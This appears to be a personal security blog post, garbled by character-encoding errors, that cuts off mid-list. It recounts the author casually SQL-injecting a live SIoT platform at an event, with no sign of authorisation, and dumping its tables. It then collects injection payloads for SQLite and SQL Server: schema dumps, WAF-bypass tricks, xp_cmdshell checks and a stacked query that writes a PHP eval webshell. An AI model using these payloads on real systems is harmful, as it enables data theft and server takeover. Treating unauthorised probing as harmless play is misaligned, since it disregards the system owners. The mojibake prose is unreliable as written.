<!DOCTYPE html><html lang="en" theme-mode="light"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>å„ç§æ•°æ®åº“ç±»å‹sqlæ³¨å…¥ | Vincent</title><link rel="icon" type="image/x-icon" href="/favicon.ico"><script>var config = {"root":"/","search":{"preload":"all","activeHolder":"é”®å…¥ä»¥ç»§ç»­","blurHolder":"æ•°æ®æ£€ç´¢","noResult":"æ—  $0 ç›¸å…³æ•°æ®"},"code":{"codeInfo":"$0 - å…± $1 è¡Œ","copy":"å¤åˆ¶","copyFinish":"å¤åˆ¶æˆåŠŸ","expand":"å±•å¼€"}}</script><script src="//unpkg.com/valine/dist/Valine.min.js"></script><script src="//unpkg.com/mermaid@9.2.2/dist/mermaid.min.js"></script><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lightgallery.css"><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lg-zoom.css"><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lg-thumbnail.css"><link type="text/css" rel="stylesheet" href="/lib/fontawesome/brands.min.css"><link type="text/css" rel="stylesheet" href="/lib/fontawesome/fontawesome.min.css"><link rel="stylesheet" href="/css/arknights.css"><script>if (window.localStorage.getItem('theme-mode') === 'light') document.documentElement.setAttribute('theme-mode', 'light')
if (window.localStorage.getItem('theme-mode') === 'dark') document.documentElement.setAttribute('theme-mode', 'dark')</script><style>@font-face {
 font-family: BenderLight;
 src: local('Bender'), url("/font/BenderLight.ttf");
}
@font-face {
 font-family: 'JetBrains Mono';
 src: local('JetBrains Mono'), url('/font/JetBrainsMono-Regular.woff2') format('woff2');
}
@font-face {
 font-family: 'Font Awesome 6 Brands';
 src: local('Font Awesome 6 Brands'), url('/lib/fontawesome/fa-brands.woff2') format('woff2');
}
@font-face {
 font-family: 'Font Awesome 6 Free';
 src: local('Font Awesome 6 Free'), url('/lib/fontawesome/fa-regular.woff2') format('woff2');
}</style><style>:root {
  --dark-background: url('https://cdnjson.com/images/2023/05/14/bg.jpg');
  --light-background: url('https://cdnjson.com/images/2023/05/14/bk.jpg');
}</style><meta name="generator" content="Hexo 6.3.0"></head><body><div class="loading" style="opacity: 0"><div class="loadingBar left"></div><div class="loadingBar right"></div></div><main><header class="closed"><nav><div class="navBtn hide"><i class="navBtnIcon"><span class="navBtnIconBar"></span><span class="navBtnIconBar"></span><span class="navBtnIconBar"></span></i></div><div class="navItem" id="search-header"><span class="navItemTitle"><input autocomplete="off" autocorrect="off" autocapitalize="none" placeholder="æ•°æ®æ£€ç´¢" spellcheck="false" maxlength="50" type="text" id="search-input"></span></div><div class="navItem" id="search-holder"></div><div class="search-popup"><div id="search-result"></div></div><ol class="navContent"><li class="navItem"><a class="navBlock" href="/"><span class="navItemTitle">Home</span></a></li><li class="navItem" matchdata="categories,tags"><a class="navBlock" href="/archives/"><span class="navItemTitle">Archives</span></a></li><li class="navItem"><a class="navBlock" href="/about/"><span class="navItemTitle">About</span></a></li></ol></nav></header><article><div id="post-bg"><div id="post-title"><h1>å„ç§æ•°æ®åº“ç±»å‹sqlæ³¨å…¥</h1><div id="post-info"><span>æ–‡ç« å‘å¸ƒæ—¶é—´: <div class="control"><time datetime="2023-07-05T11:04:17.000Z" id="date"> 2023-07-05</time></div></span><br><span>æœ€åæ›´æ–°æ—¶é—´: <div class="control"><time datetime="2023-08-08T08:15:11.857Z" id="updated"> 2023-08-08</time></div></span></div></div><hr><div id="post-content"><p>åœ¨ä¸€ä¸ªä¸å¶ç„¶çš„æœºé‡ä¹‹ä¸‹ï¼Œæ¥è§¦åˆ°äº†siotå¹³å°ï¼Œæ— èŠä¹‹ä¸‹ï¼Œå‘ç°äº†ä¸€ä¸ªä¸€ä¸ªsqlæ³¨å…¥çš„æ¼æ´ï¼ŒåŒæ—¶å¼•å‡ºäº†ä»Šå¤©çš„æ–‡ç« </p>
<span id="more"></span>

<h1 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h1><p>è¿™æ˜¯ä¸€æ¬¡æ— èŠçš„å©´å¹¼å„¿æ€§è´¨çš„ç§‘æŠ€æ´»åŠ¨ï¼Œæœ¬äººè¢«è¿«å‚åŠ </p>
<p>ä»Šå¤©ä¸Šåˆçš„åœ¨æ´»åŠ¨ä¸­æ‘¸é±¼çš„æ—¶å€™ï¼Œå¶ç„¶ä¸€ç¥å‘ç°äº†ä¸€ä¸ªç±»ä¼¼ç•™è¨€æ¿çš„æœç´¢æ¡†ï¼Œå¿ƒæƒ³é—²ç€æ²¡äº‹ï¼Œæ­£å¥½sqlæ³¨å…¥ç©ç©ğŸ˜</p>
<h1 id="æ³¨å…¥å†ç¨‹"><a href="#æ³¨å…¥å†ç¨‹" class="headerlink" title="æ³¨å…¥å†ç¨‹"></a>æ³¨å…¥å†ç¨‹</h1><p>å› ä¸ºå½“æ—¶äººæ¯”è¾ƒå¤šè¿˜æ˜¯æ‘¸é±¼çš„æ€•è¢«å‘ç°ï¼Œæ²¡æœ‰è®°å½•å¤ªå¤šï¼Œåªæ˜¯ä¿ç•™äº†ä¸€äº›çè´µçš„å›¾åƒä»¥åŠå½“æ—¶çš„æ³¨å…¥è¯­å¥ï¼Œè¿™é‡Œç®€å•å™è¿°ä¸€ä¸‹ï¼Œåé¢ä¼šæœ¬åœ°æ­å»ºsiotå¹³å°ç ”ç©¶çš„ï¼ˆå¦‚æœæœ‰ä»·å€¼çš„è¯ï¼‰</p>
<ol>
<li><p>å•å¼•å·é—­åˆå¼¹é”™è¯¯æ¶ˆæ¯ï¼ŒåŒå¼•å·é—­åˆä¸æŠ¥é”™ï¼Œåˆ¤æ–­å‡ºæ˜¯å•å¼•å·é—­åˆ</p>
</li>
<li><p>çŒœæµ‹æ˜¯postæäº¤â€œ#â€é—­åˆæ— æ•ˆï¼Œå°è¯•â€â€“+â€œæˆåŠŸï¼ˆåŸå› åé¢ä¼šè¯´ï¼‰ï¼Œåˆ¤æ–­å‡ºé—­åˆæ˜¯å•å¼•å·</p>
</li>
<li><p>order byåˆ¤æ–­å­—æ®µæ•°æ˜¯5</p>
</li>
<li><p>union select è”åˆæŸ¥è¯¢æ³¨å‡ºå›æ˜¾ç‚¹ä¸º1ï¼Œ2ï¼Œ4<br class='item-img' data-src='/pic/%E5%90%84%E7%A7%8D%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B1%BB%E5%9E%8Bsql%E6%B3%A8%E5%85%A5/1.png'><img src="/pic/%E5%90%84%E7%A7%8D%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B1%BB%E5%9E%8Bsql%E6%B3%A8%E5%85%A5/1.png"></p>
</li>
<li><p>å°è¯•è·å–åŸºæœ¬ä¿¡æ¯</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">union select database(),2,3,4,5<br></code></pre></td></tr></table></figure>

<p> æŠ¥é”™ï¼Œæ€€ç–‘è¿‡æ»¤ï¼Œç”¨ä¸Šäº†bypass wafçš„æ³¨é‡Šä¾æ—§ä¸è¡Œï¼Œå°è¯•æŠŠdatabaseæ¢æˆversion userå‡å¤±è´¥</p>
<p> æ²¡å…³ç³»å¯èƒ½è¿™ä¸€æ­¥è¢«å…¨éƒ¨è¿‡æ»¤äº†ï¼Œç›´æ¥æ„é€ ä¸‹ä¸€æ­¥çš„è¯­å¥</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">union select group_concat(table_name) from information_schema.tables where table_schema.tables=database()<br></code></pre></td></tr></table></figure>

<p> ä¾æ—§æŠ¥é”™</p>
</li>
<li><p>æ­¤æ—¶æ„è¯†åˆ°åº”è¯¥æ•°æ®åº“ç±»å‹ä¸æ˜¯MySQLï¼Œè¶…å‡ºäº†çŸ¥è¯†èŒƒå›´</p>
<p> æŸ¥é˜…siotå®˜æ–¹æ–‡æ¡£ï¼Œå‘ç°æ•°æ®åº“ç±»å‹æ˜¯sqlite</p>
<p class='item-img' data-src='/pic/%E5%90%84%E7%A7%8D%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B1%BB%E5%9E%8Bsql%E6%B3%A8%E5%85%A5/2.png'><img src="/pic/%E5%90%84%E7%A7%8D%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B1%BB%E5%9E%8Bsql%E6%B3%A8%E5%85%A5/2.png"></p>
<p> éªŒè¯äº†ä¸€ä¸‹ï¼Œç¡®å®æ˜¯sqliteæ•°æ®åº“ï¼š</p>
<p class='item-img' data-src='/pic/%E5%90%84%E7%A7%8D%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B1%BB%E5%9E%8Bsql%E6%B3%A8%E5%85%A5/3.png'><img src="/pic/%E5%90%84%E7%A7%8D%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B1%BB%E5%9E%8Bsql%E6%B3%A8%E5%85%A5/3.png"></p>
<p> ç„¶åéšä¾¿æ‰¾äº†ä¸€ä¸ªsqliteçš„æ³¨å…¥è¯­å¥ï¼ˆæ¯•ç«Ÿå½“æ—¶ç®¡ä¸äº†ä»€ä¹ˆå¤šçš„äº†ï¼Œå…ˆæ³¨å‡ºæ¥è¦ç´§ï¼‰</p>
</li>
<li><p>ä¸€æ­¥è·å–è¡¨åä»¥åŠåˆ—å</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sqlite">&#x27; union select (select group_concat(sql) from sqlite_master),2,3,4,5 --+<br></code></pre></td></tr></table></figure>

<p class='item-img' data-src='/pic/%E5%90%84%E7%A7%8D%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B1%BB%E5%9E%8Bsql%E6%B3%A8%E5%85%A5/4.png'><img src="/pic/%E5%90%84%E7%A7%8D%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B1%BB%E5%9E%8Bsql%E6%B3%A8%E5%85%A5/4.png"></p>
<p> ï¼ˆæˆ‘è‡ªå·±éƒ½ä¸ä¿¡æˆ‘å½“æ—¶æœ‰æ—¶é—´æŠŠå›¾æˆªä¸‹æ¥è¿˜ç”¨ä¸¤ç§é¢œè‰²çš„è§å…‰ç¬”æ ‡å‡ºæ¥è¡¨åå’Œåˆ—åï¼‰</p>
<p> okåˆ°äº†è¿™ä¸€æ­¥å°±å·®ä¸å¤šäº†</p>
</li>
<li><p>æœ€åä¸€æ­¥</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sqlite">&#x27; union select (select group_concat(Description) from Project),2,3,4,5 --+<br></code></pre></td></tr></table></figure>

<p> å› ä¸ºå½“æ—¶åŸŸæœåŠ¡å™¨é©¬ä¸Šå°±è¦å…³äº†ï¼Œæœ‰ç‚¹ç€æ€¥ï¼Œæ²¡æœ‰è·å–å…¨éƒ¨çš„åˆ—åå°±éšä¾¿æŒ‘äº†ä¸€ä¸ª</p>
<p class='item-img' data-src='/pic/%E5%90%84%E7%A7%8D%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B1%BB%E5%9E%8Bsql%E6%B3%A8%E5%85%A5/5.png'><img src="/pic/%E5%90%84%E7%A7%8D%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B1%BB%E5%9E%8Bsql%E6%B3%A8%E5%85%A5/5.png"><br> ï¼ˆçœŸæ˜¯ä¸€ä¸ªè®¤çœŸçš„æè¿°ï¼)</p>
<p> åˆ°æ­¤ç»“æŸ</p>
</li>
</ol>
<h1 id="å¤ç›˜åæ€"><a href="#å¤ç›˜åæ€" class="headerlink" title="å¤ç›˜åæ€"></a>å¤ç›˜åæ€</h1><p>è¿™ä¸€æ¬¡çš„æ³¨å…¥ä¸»è¦å¡åœ¨äº†æ•°æ®åº“æ³¨å…¥è¯­å¥çš„é—®é¢˜ï¼Œå› æ­¤ä»Šå¤©è¿™ç¯‡æ–‡ç« å°±æ¥æ¢³ç†ä¸€ä¸‹ä¸»è¦çš„æ•°æ®åº“ç±»å‹çš„æ³¨å…¥è¯­å¥</p>
<p>ç›®å‰ä¸»æµçš„æ˜¯è¿™äº›ï¼š</p>
<ul>
<li><p>sqlite </p>
</li>
<li><p>PostgreSQL</p>
</li>
<li><p>sql server </p>
</li>
<li><p>orancle </p>
</li>
<li><p>mongoDB</p>
</li>
<li><p>redis </p>
</li>
<li><p>cassandra</p>
</li>
<li><p>couchDB</p>
</li>
<li><p>MariaDB</p>
</li>
<li><p>mysql</p>
</li>
</ul>
<p>ç›®å‰æœ€æœ€ä¸»æµçš„å°±æ˜¯MySQLï¼Œå·²ç»ä¼šäº†ï¼Œè¿™é‡Œä¸ä½œå™è¿°ï¼Œä»Šå¤©ä¸»è¦æŒ‘é€‰sqliteã€sql serverã€orancle ã€PostgreSQLè¿™å‡ ä¸ªå±•å¼€</p>
<p>åˆ†åˆ«ä»åŸºç¡€æ³¨å…¥è¯­å¥ä»¥åŠgetshellä¸¤æ–¹é¢è®°å½•,å½“ç„¶æ­¤æ–‡ç« å¹¶ä¸ä¼šæ·±å…¥æ¢è®¨ï¼Œåœ¨å®æˆ˜ä¸­è¿˜æ˜¯ä½¿ç”¨sqlmapæ›´åŠ é«˜æ•ˆä¸€äº›</p>
<h1 id="Sqlite"><a href="#Sqlite" class="headerlink" title="Sqlite"></a>Sqlite</h1><blockquote>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/HBohan/article/details/120672745">https://blog.csdn.net/HBohan/article/details/120672745</a><br><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/8627">https://xz.aliyun.com/t/8627</a></p>
</blockquote>
<p>è¿™ä¸ªæ³¨å…¥ä¸mysqlæœ€åƒï¼Œå› æ­¤å…ˆä»è¿™ä¸ªå¼€å§‹ï¼Œæˆ‘ä»¬ä»æœ€åŸºæœ¬çš„æ­¥éª¤æ¥è®°å½•</p>
<p>ä¸ºäº†ç ”ç©¶ï¼Œæˆ‘å°†siotæœ¬åœ°å¹³å°æ­å»ºåœ¨äº†è™šæ‹Ÿæœºä¸Šæ–¹ä¾¿ç ”ç©¶</p>
<h2 id="åˆ¤æ–­æ–¹æ³•"><a href="#åˆ¤æ–­æ–¹æ³•" class="headerlink" title="åˆ¤æ–­æ–¹æ³•"></a>åˆ¤æ–­æ–¹æ³•</h2><p>åˆ©ç”¨æ­¤æ•°æ®åº“è¯­è¨€çš„ç‰¹æœ‰å‡½æ•°ï¼šsqlite_version()</p>
<h2 id="åŸºæœ¬æ³¨å…¥"><a href="#åŸºæœ¬æ³¨å…¥" class="headerlink" title="åŸºæœ¬æ³¨å…¥"></a>åŸºæœ¬æ³¨å…¥</h2><ol>
<li><p>åˆ¤æ–­é—­åˆ </p>
<p>åŒMySQL æ³¨é‡Šç¬¦ä¸ºâ€œâ€“+â€ æˆ–è€…ä¹Ÿå¯ä»¥ä½¿ç”¨â€œ&#x2F;*â€ ä¸å¯ä½¿ç”¨â€œ#â€ æœ‰æ—¶å€™å¯ä»¥ä½¿ç”¨â€œ;â€ </p>
</li>
<li><p>è·å–å­—æ®µæ•° åŒMySQL</p>
</li>
<li><p>åˆ¤æ–­å›æ˜¾ç‚¹ åŒMySQL</p>
</li>
<li><p>è·å–è¡¨åã€åˆ—å</p>
<p>ä¸åŒäºMySQLçš„æ˜¯ï¼Œè¿™åªéœ€è¦ä¸€æ­¥å°±å¯ä»¥å¾—å‡ºäº†ï¼Œpayloadå¦‚ä¸‹ï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">&#x27; union select group_concat(sql),2,3,4,5 from sqlite_master --+<br></code></pre></td></tr></table></figure>

<p>è¿™ä¸ªè¯­å¥æ‰§è¡Œåä¼šå›æ˜¾å‡ºåˆ›å»ºè¡¨çš„è¯­å¥ï¼Œä»¥è¾¾åˆ°è·å–è¡¨åå’Œåˆ—åçš„æ•ˆæœ</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">CREATE TABLE &quot;Project&quot; ( &quot;ID&quot; text(80,0) NOT NULL, &quot;Description&quot; text(200,0), &quot;Created&quot; integer(11,0) NOT NULL, PRIMARY KEY(&quot;ID&quot;) ),CREATE TABLE &quot;Device&quot; ( &quot;ProjectID&quot; text(80,0) NOT NULL, &quot;DeviceName&quot; text(100,0) NOT NULL, &quot;Created&quot; int(11,0) NOT NULL, &quot;DeviceDesc&quot; text(200,0), &quot;ID&quot; text(70,0) NOT NULL, PRIMARY KEY(&quot;ID&quot;) ),CREATE TABLE &quot;Message&quot; ( &quot;Topic&quot; text(80,0) NOT NULL, &quot;Content&quot; text(200,0), &quot;Created&quot; integer(11,0) NOT NULL, &quot;ID&quot; INTEGER NOT NULL PRIMARY KEY AUTOINCREMENT ),CREATE TABLE sqlite_sequence(name,seq),CREATE INDEX &quot;&quot; ON Message (&quot;Created&quot; COLLATE NOCASE DESC)<br></code></pre></td></tr></table></figure>

<p>çœ‹ç€æœ‰ç‚¹ä¹±ï¼Œä½†æ˜¯åº”è¯¥éƒ½æ˜¯å¯ä»¥åˆ¤æ–­å‡ºæ¥çš„</p>
</li>
<li><p>è·å–å…¨éƒ¨å†…å®¹</p>
<p>ä¸€ä¸Šé¢çš„å†…å®¹ä¸¾ä¾‹ï¼Œæˆ‘ä»¬æ„é€ çš„è¯­å¥å’Œmysqlçš„è¯­å¥å·®ä¸å¤šï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">&#x27; union select group_concat(ID,Description),2,3,4,5 from Project/*<br></code></pre></td></tr></table></figure>

<p>æœ‰ä¸€ç‚¹éœ€è¦æ³¨æ„ï¼Œä¸Šé¢çš„Projectè¡¨ä¸­è¿˜å«æœ‰ä¸€ä¸ªâ€œCreatedâ€çš„åˆ—åï¼Œä»–çš„ç±»å‹æ˜¯intï¼Œä¸èƒ½å’Œtextç±»å‹çš„æ•°æ®ä¸€èµ·æ”¾åœ¨group_concaté‡Œé¢æ¥è¾“å‡º</p>
</li>
</ol>
<h2 id="GetShell"><a href="#GetShell" class="headerlink" title="GetShell"></a>GetShell</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">&#x27;;ATTACH DATABASE &#x27;C:\\shell.php&#x27; AS shell;<br>create TABLE shell.exp (payload); <br>insert INTO shell.exp (payload) VALUES (&#x27;&lt;?php @eval($_POST[&quot;cmd&quot;]); ?&gt;&#x27;) <br>--+<br></code></pre></td></tr></table></figure>

<p>å¦‚æœåå°çš„æŸ¥è¯¢è¯­å¥æ˜¯query()å°±ä¸èƒ½ä½¿ç”¨è¿™ä¸ªè¯­å¥äº†</p>
<p>å¦‚æœä½¿ç”¨çš„æ˜¯exec()å°±å¯ä»¥ä½¿ç”¨ï¼Œä¹Ÿå°±æœ‰äº†å †å æ³¨å…¥ï¼Œæœ‰äº†æ›´å¤§çš„æ“ä½œç©ºé—´</p>
<p>å½“ç„¶ï¼Œè¦è·å–ç»å¯¹è·¯å¾„å°±åªèƒ½çœ‹è‡ªå·±çš„è¿æ°”å’Œé€ è¯£äº†ï¼Œå¸¸è§çš„æ˜¯é€šè¿‡åˆ¶é€ æŠ¥é”™å’Œè·å–ç½‘ç«™çš„phpinfo.php</p>
<p>sqliteå°±ç²—ç•¥çš„åˆ°è¿™é‡Œå§ï¼Œåé¢çš„æ‹“å±•éšç¼˜è®°å½•</p>
<h1 id="Sql-Server"><a href="#Sql-Server" class="headerlink" title="Sql Server"></a>Sql Server</h1><blockquote>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_42990434/article/details/111287071">https://blog.csdn.net/qq_42990434/article/details/111287071</a></p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/LJH1999ZN/article/details/122911809">https://blog.csdn.net/LJH1999ZN/article/details/122911809</a></p>
<p><a target="_blank" rel="noopener" href="https://payloads.online/article/417aef69-1622-4985-8690-09504bfd40cd">https://payloads.online/article/417aef69-1622-4985-8690-09504bfd40cd</a></p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/zzgslh/article/details/111695332">https://blog.csdn.net/zzgslh/article/details/111695332</a></p>
<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/8603">https://xz.aliyun.com/t/8603</a></p>
</blockquote>
<h2 id="åˆ¤æ–­æ–¹æ³•-1"><a href="#åˆ¤æ–­æ–¹æ³•-1" class="headerlink" title="åˆ¤æ–­æ–¹æ³•"></a>åˆ¤æ–­æ–¹æ³•</h2><p>å¿˜è®°å“ªä¸€ä¸ªæ–‡ç« é‡Œé¢æœ‰ä¸€ä¸ªå¸ˆå‚…è¯´çœ‹è§é¡µé¢å¤§éƒ¨åˆ†çš„æ–‡ä»¶éƒ½æ˜¯.asp .aspxå°±å¯ä»¥å¤§è‡´åˆ¤å®šæ•°æ®åº“ç±»å‹æ˜¯sql serveräº†ï¼Œä½†æ˜¯è¿™ä¸ªæ€»ç»“ç¡®å®éå¸¸å‡†ç¡®ç²¾è¾Ÿ</p>
<p>å¼€æ”¾ç«¯å£ï¼š1433</p>
<h2 id="åŸºæœ¬æ³¨å…¥-1"><a href="#åŸºæœ¬æ³¨å…¥-1" class="headerlink" title="åŸºæœ¬æ³¨å…¥"></a>åŸºæœ¬æ³¨å…¥</h2><p>é¦–å…ˆç®€å•çœ‹çœ‹ä¸€äº›å¸¸ç”¨çš„è¯­å¥å’Œå‡½æ•°å§</p>
<ul>
<li><p>@@version &#x2F;&#x2F; æ•°æ®åº“ç‰ˆæœ¬</p>
</li>
<li><p>system_user &#x2F;&#x2F;ç³»ç»Ÿç”¨æˆ·å</p>
</li>
<li><p>suser_sname() &#x2F;&#x2F;æŸ¥å‡ºå½“å‰æ“ä½œæ•°æ®åº“çš„ç™»å…¥åï¼Œä¸€èˆ¬å’Œè§¦å‘å™¨ä¸€èµ·ç”¨æ¥ç›‘æ§æ˜¯è°å¯¹è¡¨åšäº†æ“ä½œ</p>
</li>
<li><p>user &#x2F;&#x2F;è·å–å½“å‰æ•°æ®åº“ç”¨æˆ·å</p>
</li>
<li><p>db_name() &#x2F;&#x2F; å½“å‰æ•°æ®åº“å å…¶ä¸­db_name(N)å¯ä»¥æ¥éå†å…¶ä»–æ•°æ®åº“</p>
</li>
<li><p>db_name(7) &#x2F;&#x2F;æŸ¥è¯¢åº“åï¼Œ1-6ä¸ºç³»ç»Ÿåº“ï¼Œ7å¼€å§‹ä¸ºå…¶ä»–åº“</p>
</li>
<li><p>select host_name())&#x2F;&#x2F;ä¸»æœºå</p>
</li>
<li><p>;select user &#x2F;&#x2F;æŸ¥è¯¢æ˜¯å¦æ”¯æŒå¤šè¯­å¥(å †å æ³¨å…¥)</p>
</li>
<li><p>select is_srvrolemember(â€˜sysadminâ€™) &#x2F;&#x2F;åˆ¤æ–­æ˜¯å¦æ˜¯ç³»ç»Ÿç®¡ç†å‘˜ï¼Œ0å°±æ˜¯false</p>
</li>
<li><p>select is_srvrolemember(â€˜db_ownerâ€™) &#x2F;&#x2F;åˆ¤æ–­æ˜¯å¦æ˜¯åº“æƒé™ï¼Œ0å°±æ˜¯false</p>
</li>
<li><p>select is_srvrolemember(â€˜publicâ€™) &#x2F;&#x2F;åˆ¤æ–­æ˜¯å¦ä¸ºpublicæƒé™ï¼Œ0å°±æ˜¯false</p>
</li>
<li><p>select count(*) from master.dbo.sysobjects where xtype&#x3D;â€™Xâ€™ and name&#x3D;â€™xp_cmdshellâ€™ &#x2F;&#x2F;æŸ¥è¯¢xp_cmdshellï¼Œ1ä¸ºå­˜åœ¨</p>
</li>
<li><p>select name from master.dbo.sysdatabases where dbid&#x3D;7 &#x2F;&#x2F;ä¿®æ”¹dbidæ•°å€¼ï¼ŒæŸ¥è¯¢åº“åï¼Œ1-6ä¸ºç³»ç»Ÿåº“</p>
<hr>
<p>è¿™ä¸¤æ¡ä»…é™äº&gt;&#x3D;2005çš„ç‰ˆæœ¬</p>
</li>
<li><p>select quotename(name) from masterâ€¦sysdatabases FOR XML PATH(â€˜â€™)</p>
</li>
<li><p>select â€˜|â€™%2bname%2bâ€™|â€™ from masterâ€¦sysdatabases FOR XML PATH(â€˜â€™)</p>
<hr>
</li>
</ul>
<p>å› ä¸ºæ²¡æœ‰ç¯å¢ƒæµ‹è¯•ï¼Œæš‚æ—¶æ²¡æœ‰å®æ“è¯­å¥ï¼Œä¹‹åé‡åˆ°äº†å†è®°å½•ï¼Œè¿™é‡Œå†ç®€å•å†™ä¸€äº›bypassæ‰‹æ³•ï¼ˆå…¶å®å°±æ˜¯æ–‡ç« é‡Œé¢çš„ï¼‰</p>
<p><strong>ç»•è¿‡æ–¹å¼ï¼š</strong><br>mssqlç©ºç™½ç¬¦ï¼Œ%01-%20éƒ½ä¸ºç©ºç™½ç¬¦ï¼Œâ€“å’Œ&#x2F;**&#x2F;ä¸ºæ³¨é‡Šï¼Œ%00ä¹Ÿå¯å……å½“æ³¨é‡Šç¬¦</p>
<p>å¼•è¿›ä¸€ä¸ªdeclare å‡½æ•°ï¼Œä»–æ˜¯mssqlå£°æ˜å±€éƒ¨å˜é‡çš„å‡½æ•°ï¼Œæˆ‘ä»¬ç»å¸¸ç”¨å®ƒæ¥ç»•è¿‡wafå¯¹ä¸€äº›å…³é”®è¯çš„æ‹¦æˆª</p>
<p>select * from admin where id &#x3D;1;declare @a nvarchar(2000) set @a&#x3D;â€˜select convert(int,@@version)â€™ exec(@a) â€“<br>å †å æ³¨å…¥ï¼Œä½¿ç”¨declare å’Œexecè¿›è¡Œæ— selectæ³¨å…¥</p>
<p>declare @s varchar(2000) set @s&#x3D;0x73656C6563742031 exec(@s)<br>declareå®šä¹‰å˜é‡ setè®¾ç½®å˜é‡å€¼ execæ‰§è¡Œå˜é‡</p>
<p>å˜é‡çš„å€¼æ˜¯æ”¯æŒhexå’Œasciiç çš„,å½“è¿‡æ»¤å¼•å·æˆ‘ä»¬å°±å¯ä»¥è¿™ä¹ˆç”¨</p>
<p>é¿å…ä½¿ç”¨å¼•å·</p>
<p>(select top 1 name from syscolumns where id&#x3D;object_id(â€˜adminâ€™))</p>
<p>(select top 1 name from syscolumns where id&#x3D;object_id(char(97)+char(100)+char(109)+char(105)+char(110)))</p>
<hr>
<p>ç°åœ¨å¼€å§‹æ­£å¼çš„æ³¨å…¥æ­¥éª¤è®°å½•</p>
<h3 id="è”åˆæŸ¥è¯¢"><a href="#è”åˆæŸ¥è¯¢" class="headerlink" title="è”åˆæŸ¥è¯¢"></a>è”åˆæŸ¥è¯¢</h3><ol>
<li><p>åˆ¤æ–­é—­åˆ æ³¨é‡Šç¬¦ä¸ºâ€“+ åŒMySQL</p>
</li>
<li><p>åˆ¤æ–­å­—æ®µæ•° åŒMySQL</p>
</li>
<li><p>æ³¨å‡ºå›æ˜¾ç‚¹ åŒMySQL</p>
</li>
<li><p>æŸ¥è¯¢æ•°æ®åº“</p>
<p>è¿™é‡Œéœ€è¦å…ˆç¡®è®¤æ¯ä¸€åˆ—çš„æ•°æ®ç±»å‹ï¼Œå°†<code>union select 1,2,3</code>æ›¿æ¢æˆ<code>union all select null,null,null</code> æ·»åŠ allæ˜¯ä¸ºäº†ä¸è®©ç¨‹åºè‡ªåŠ¨å»é‡</p>
<p>è¿™ä¸€æ­¥éœ€è¦æšä¸¾å‡ºæ¯ä¸€åˆ—çš„æ•°æ®ç±»å‹ï¼Œå‡å¦‚æˆ‘ä»¬æ­¤æ—¶æšä¸¾å‡ºåçš„payloadæ˜¯ï¼š<code>union all select 1,null,null</code> é‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥æŠŠéœ€è¦æŸ¥è¯¢çš„ä¸œè¥¿æ”¾åˆ°â€nullâ€œä½ä¸Š</p>
<p>a.æŸ¥è¯¢å…¨éƒ¨æ•°æ®åº“ï¼ˆa.b.ä¸¤æ­¥å‡ä¸ºæ•°å­—å‹æ³¨å…¥ä¸‹ï¼Œå¦‚æœæ˜¯å­—ç¬¦å‹æ³¨å…¥éœ€è¦é—­åˆåŠ ä¸Šæ³¨é‡Šï¼‰</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mssql">UNION all SELECT 1,null,name from master..sysdatabases<br></code></pre></td></tr></table></figure>

<p>b.æŸ¥è¯¢å½“å‰æ•°æ®åº“</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mssql">UNION all SELECT 1,2,db_name() from master..sysdatabases<br></code></pre></td></tr></table></figure>
</li>
<li><p>è·å–æ•°æ®åº“ä¸­çš„è¡¨å</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mssql">UNION all SELECT 1,2,name from æ•°æ®åº“åç§°..sysobjects where xtype = 0x75 <br></code></pre></td></tr></table></figure>

<p>0x75å¯¹åº”çš„æ˜¯å­—ç¬¦â€œuâ€</p>
</li>
<li><p>è·å–å½“å‰è¡¨åçš„åˆ—å</p>
